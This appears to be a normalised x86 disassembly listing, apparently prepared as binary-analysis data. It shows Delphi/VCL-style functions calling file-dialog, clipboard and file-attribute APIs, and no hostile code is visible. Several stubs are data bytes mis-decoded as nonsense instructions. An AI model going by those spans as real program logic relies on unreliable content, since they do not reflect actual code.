sub_42e40d
jmp sub_403a3c
sub_42e414
pop ebp
retn
sub_42e418
sub [ rw-data ] 0x1
retn
sub_42e5d7
jmp sub_403a3c
sub_42e5de
pop ebp
retn
sub_42e993
jmp sub_403a3c
sub_42e99a
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42edb4
jmp sub_403a3c
sub_42edbb
pop ebp
retn
sub_42edc0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e350
mov [ rw-data ] eax
sub_42ee01
jmp sub_403a3c
sub_42ee08
pop ebp
retn
sub_42ee0c
sub [ rw-data ] 0x1
retn
sub_42f22c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_450658
sub_42f240
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_450658
sub_42f416
jmp sub_403a3c
sub_42f41d
pop ecx
pop ecx
pop ebp
retn
sub_42f424
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450658
mov edx esi
mov eax ebx
call sub_452690
pop esi
pop ebx
retn
sub_42f440
push ebx
mov ebx eax
mov eax ebx
call sub_4526d0
mov al [ r-xdata ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_450658
sub_42f4ec
retn
sub_42f59c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44a128
sub_42f5f8
push ebx
mov ebx edx
mov edx ebx
call sub_4679c0
or [ ebx + 0x4 ] 0x80000000
pop ebx
retn
sub_42f746
jmp sub_403a3c
sub_42fa21
jmp sub_403a3c
sub_42fa28
pop ebp
retn
sub_42fa2c
sub [ rw-data ] 0x1
retn
sub_42fa59
jmp sub_403a3c
sub_42fa60
pop ebp
retn
sub_42fa64
sub [ rw-data ] 0x1
retn
sub_42fa91
jmp sub_403a3c
sub_42fa98
pop ebp
retn
sub_42fa9c
sub [ rw-data ] 0x1
retn
sub_42fac9
jmp sub_403a3c
sub_42fad0
pop ebp
retn
sub_42fad4
sub [ rw-data ] 0x1
retn
sub_42fb01
jmp sub_403a3c
sub_42fb08
pop ebp
retn
sub_42fb0c
sub [ rw-data ] 0x1
retn
sub_42fba1
jmp sub_403a3c
sub_42fba8
pop ebp
retn
sub_42fbac
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
sub_42fbe1
jmp sub_403a3c
sub_42fbe8
pop ebp
retn
sub_42fbec
sub [ rw-data ] 0x1
retn
sub_42fc19
jmp sub_403a3c
sub_42fc20
pop ebp
retn
sub_42fc24
sub [ rw-data ] 0x1
retn
sub_430011
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x4300
sub_4300c8
jmp r-xdata
sub_4300ca
0xe0ffe9ff 0x4308
sub_43051a
jmp sub_403788
sub_43051f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43053c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_430544
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4034a4
pop esi
retn
sub_43055c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4034a4
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_430574
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_43061d
jmp sub_403a3c
sub_43064b
jmp sub_403a3c
sub_430652
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43065c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_430670
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_430908
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_430928
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_430948
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_43099a
jmp sub_403a3c
sub_4309a1
pop ecx
pop ebp
retn
sub_430ce9
jmp sub_403a3c
sub_430cf0
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430e29
jmp sub_403a3c
sub_430e30
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430eef
jmp sub_403a3c
sub_430ef6
pop ebx
mov esp ebp
pop ebp
retn
sub_430fa8
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_431010
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_430a38
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_431028
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_4312f8
jmp sub_403a3c
sub_4312ff
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4313ca
jmp sub_403a3c
sub_4313db
jmp sub_403788
sub_431406
jmp sub_403a3c
sub_43143a
jmp sub_403a3c
sub_431441
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4315f9
jmp sub_403a3c
sub_431600
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431c58
jmp sub_403a3c
sub_431c5f
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431d6f
jmp sub_403a3c
sub_431d76
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_431d84
or ecx 0xffffffff
or edx 0xffffffff
call sub_431d90
retn
sub_431d90
push 0x0
push edx
push ecx
mov dl 0x4
mov cx [ r-xdata ]
call sub_431cac
retn
sub_431f4e
jmp sub_403a3c
sub_431f55
pop ebp
retn
sub_432028
pushad
retn 0x44
sub_43233f
add [ eax ] eax
jmp [ eax - 0x17 ]
sub_432d67
[ edx ]
sub_432de6
add [ eax ] eax
jmp [ eax - 0x17 ]
sub_433a84
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_433c7d
jmp sub_403a3c
sub_433c84
pop ebx
mov esp ebp
pop ebp
retn
sub_433d90
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_433e00
sub_433da8
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_433db8
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_433e00
sub_433dd0
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_433e00
sub_433de8
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_433e00
sub_434052
jmp sub_403788
sub_43410b
jmp sub_403a3c
sub_434112
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434150
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43427c
push ebx
mov ebx eax
mov eax ebx
call sub_452690
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434290
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4342c4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_4343c8
jmp sub_403a3c
sub_4343cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434572
jmp sub_403a3c
sub_434579
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434583
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_434598
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44f978
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4345d0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44f978
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4345ec
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44f978
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434608
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_450658
sub_43461c
mov al [ eax + 0x220 ]
retn
sub_434785
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_43479d
jmp sub_403a3c
sub_434aa9
jmp sub_403788
sub_434c1c
retn
sub_434da9
jmp sub_403a3c
sub_434e2c
push ebx
mov ebx eax
mov eax ebx
call sub_44e980
mov eax ebx
call sub_434c20
pop ebx
retn
sub_434e40
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44f0ac
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_434f68
pop ebx
retn
sub_434f58
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_435031
jmp sub_403a3c
sub_435038
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435080
push ebx
mov ebx eax
mov eax ebx
call sub_452614
mov eax ebx
call sub_434c20
pop ebx
retn
sub_435094
push ebx
mov ebx eax
mov eax ebx
call sub_442104
mov eax ebx
call sub_434c20
pop ebx
retn
sub_4350a8
mov al 0x1
retn
sub_4350ac
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4353e4
jmp sub_403a3c
sub_4353eb
pop ebp
retn
sub_4353f0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403dc0
mov eax [ r-xdata ]
call sub_417f08
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
sub_43544d
jmp sub_403a3c
sub_435454
pop ebp
retn
sub_435458
sub [ rw-data ] 0x1
retn
sub_435530
jmp sub_403a3c
sub_435537
pop ecx
pop ebp
retn
sub_43553c
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_435672
jmp sub_403a3c
sub_435679
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435722
jmp sub_403a3c
sub_435788
jmp sub_403a3c
sub_43578f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4357ed
jmp sub_403a3c
sub_4357f4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4358d9
jmp sub_403a3c
sub_4358e0
pop ebx
mov esp ebp
pop ebp
retn
sub_43595d
jmp sub_403a3c
sub_435964
pop ebx
mov esp ebp
pop ebp
retn
sub_435a02
jmp sub_403788
sub_435a99
jmp sub_403a3c
sub_435aa0
pop ebp
retn
sub_435aa4
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_435b20
retn
sub_435b21
jmp sub_403a3c
j_sub_435b20
jmp sub_435b20
sub_435b28
pop ebp
retn
sub_435b2c
sub [ rw-data ] 0x1
retn
sub_436574
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_436cf7
jmp sub_403a3c
sub_436d33
jmp sub_403a3c
sub_43793e
jmp sub_403a3c
sub_437945
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437bcc
call sub_44de00
retn
sub_437bd4
push ebx
mov ebx eax
mov eax ebx
call sub_437bf0
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_437be8
mov eax [ r-xdata ]
retn
sub_437bf0
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_437bfc
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_4366e4
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_437c14
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_437c4c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437cfc
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437d18
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_437c54
sub_437d2c
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437d48
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437d68
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437dc0
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_437c54
sub_437dd4
push esi
mov esi eax
mov eax esi
call sub_44dfb0
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_4034a4
sub_437f21
jmp sub_403a3c
sub_437f28
pop edi
pop esi
pop ecx
pop ebp
retn
sub_437f30
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437f38
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437f40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_436670
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_436784
pop esi
pop ebx
retn
sub_438170
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4032a8
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_438234
jmp sub_403a3c
sub_43823b
pop ebp
retn
sub_438240
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_43818c
call sub_403e0c
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402cbc
sub_438527
jmp sub_403788
sub_43855f
jmp sub_403a3c
sub_438566
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438825
jmp sub_403a3c
sub_4388d4
push ebx
mov ebx eax
mov eax ebx
call sub_4044f8
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_438a28
jmp sub_403788
sub_438ac4
jmp sub_403a3c
sub_438acb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438ad4
call sub_43065c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dc2c
retn
sub_438bc0
jmp sub_403a3c
sub_438bc7
pop ebx
mov esp ebp
pop ebp
retn
sub_438bcc
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_431010
retn
sub_438e4a
jmp sub_403a3c
sub_438e51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e6e
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_438e67
jmp sub_403a3c
sub_438e6e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438eaa
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_4698a0
sub_438f07
jmp sub_403a3c
sub_438f0e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_438f39
jmp sub_403a3c
sub_438f40
pop ebp
retn
sub_438f44
sub [ rw-data ] 0x1
retn
sub_438fa0
jmp sub_403a3c
sub_438fa7
pop ebp
retn
sub_438fac
sub [ rw-data ] 0x1
retn
sub_439008
jmp sub_403a3c
sub_43900f
pop ebp
retn
sub_439014
sub [ rw-data ] 0x1
retn
sub_439075
jmp sub_403a3c
sub_43907c
pop ebp
retn
sub_439080
sub [ rw-data ] 0x1
retn
sub_4390cc
jmp sub_403a3c
sub_4390d3
pop ebp
retn
sub_4390d8
sub [ rw-data ] 0x1
retn
sub_439e6f
jmp sub_403a3c
sub_439e7c
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_439ef4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_40408c
mov eax ebx
call sub_439e7c
pop esi
pop ebx
retn
sub_439f10
mov [ eax + 0x14 ] edx
call sub_439e7c
retn
sub_439f1c
mov [ eax + 0x18 ] edx
call sub_439e7c
retn
sub_439f54
push ebx
mov ebx eax
mov eax ebx
call sub_4195a8
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_43a0d4
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_439f28
call sub_439f64
sub_43a0ec
mov edx sub_439f28
call sub_439f64
retn
sub_43a2b1
jmp sub_403a3c
sub_43a2ec
push ebx
mov ebx ecx
mov eax ebx
call sub_404038
pop ebx
retn
sub_43a2f8
mov al 0x1
retn
sub_43a3fd
jmp sub_403a3c
sub_43a4f8
retn
sub_43a61b
jmp sub_403a3c
sub_43a622
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a96c
mov eax [ eax + 0xd0 ]
call sub_419748
retn
sub_43a9dc
mov eax [ r-xdata ]
retn
sub_43aa08
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43aa3c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_43ab2c
retn
sub_43ac73
jmp sub_403a3c
sub_43ac7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ac84
retn
sub_43aca7
jmp sub_403a3c
sub_43acae
pop ebp
retn 0x4
sub_43ad11
jmp sub_403a3c
sub_43ad18
pop ebp
retn
sub_43ad1c
sub [ rw-data ] 0x1
retn
sub_43b3ec
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c220
mov [ rw-data ] eax
sub_43b421
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43b438
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_43b468
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_43b460
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_4032a8
sub_43b6bc
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_43b7e4
retn
mov eax [ eax + 0x18 ]
retn
sub_43b6d8
or ecx 0xffffffff
xor edx edx
call sub_43b6e4
retn
sub_43b758
mov eax [ eax + 0x4 ]
call sub_4530b8
retn
sub_43b80c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b764
call sub_43b468
pop esi
pop ebx
retn
sub_43b824
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_43b8d4
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_43ba4d
jmp sub_403a3c
sub_43ba54
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ba90
mov eax [ eax + 0x23c ]
call sub_43b44c
retn
sub_43bce0
push ebx
mov ebx eax
mov eax ebx
call sub_4194d8
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43bd4c
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43bd68
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43bd84
push ebx
mov ebx eax
mov eax ebx
call sub_439f54
pop ebx
retn
sub_43bdf8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a0c0
pop esi
pop ebx
retn
sub_43bf9d
add [ esp + 0x4 ] 0xffffffec
jmp sub_43d088
sub_43bfa7
add [ esp + 0x4 ] 0xffffffec
jmp sub_43d174
sub_43bfb1
add [ esp + 0x4 ] 0xffffffec
jmp sub_43d160
sub_43bfbb
add [ esp + 0x4 ] 0xffffffec
jmp sub_43cfd8
sub_43bfcf
add [ esp + 0x4 ] 0xffffffec
jmp sub_405a08
sub_43bfd9
add [ esp + 0x4 ] 0xffffffec
jmp sub_405a1c
sub_43c524
push ebx
push esi
mov esi eax
mov eax [ esi + 0x274 ]
push eax
mov ecx [ esi + 0x270 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_43c75b
jmp sub_403a3c
sub_43c857
jmp sub_403a3c
sub_43c85e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c864
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
cmp [ edx + eax ] 0x0
add [ ebx + 0x1452ff10 ] cl
retn
sub_43c880
mov eax [ r-xdata ]
retn
sub_43c888
mov eax [ r-xdata ]
retn
sub_43c98a
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_43cb21
jmp sub_403a3c
sub_43cb28
pop ebx
pop ecx
pop ebp
retn
sub_43cbf2
jmp sub_403a3c
sub_43cbf9
pop ecx
pop ebp
retn
sub_43cc88
mov eax [ eax + 0x14 ]
call sub_419a28
retn
sub_43cdd1
jmp sub_403a3c
sub_43cdd8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ce04
mov eax [ eax + 0x14 ]
call sub_419748
retn
sub_43ce10
mov eax [ eax + 0x14 ]
call sub_419748
retn
sub_43ce1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_43ce80
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_43ce88
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_43be0c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_43ced0
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_43be0c
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_43cf24
mov eax [ r-xdata ]
retn
sub_43cf2c
mov eax [ r-xdata ]
retn
sub_43cf94
jmp sub_403a3c
sub_43cf9b
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43d058
mov eax [ eax + 0xc ]
call sub_419748
retn
sub_43d14e
jmp sub_403a3c
sub_43d155
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43d160
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_43d20f
jmp sub_403a3c
sub_43d216
pop ebp
retn
sub_43d218
sub [ rw-data ] 0x1
retn
sub_43d287
jmp [ edi ]
sub_43d528
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43d540
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43d584
push ebx
mov ebx eax
mov eax ebx
call sub_43dde0
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43ddcf
jmp sub_403a3c
sub_43dde0
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42ed44
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43d554
sub_43de37
jmp sub_403a3c
sub_43de3e
pop ebp
retn
sub_43de40
sub [ rw-data ] 0x1
retn
sub_43e5cd
add [ eax ] eax
jmp [ eax - 0x17 ]
sub_441aac
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_441c7f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x1d4d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44203a
jmp sub_403a3c
sub_442041
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4420c6
jmp sub_403a3c
sub_4420cd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4420d4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44f978
pop ebx
retn
sub_4420e8
push ebx
mov ebx eax
mov eax ebx
call sub_4526d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44f978
pop ebx
retn
sub_442104
push ebx
mov ebx eax
mov eax ebx
call sub_4516a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4421b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c874
pop esi
pop ebx
retn
sub_44231a
jmp sub_403a3c
sub_442321
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442430
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44e980
mov eax ebx
mov si 0xffc7
call sub_4034a4
pop esi
pop ebx
retn
sub_44251c
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_442538
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_4034a4
sub_442554
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_442560
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_421018
sub_442574
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4425d4
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_442648
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_4034a4
pop esi
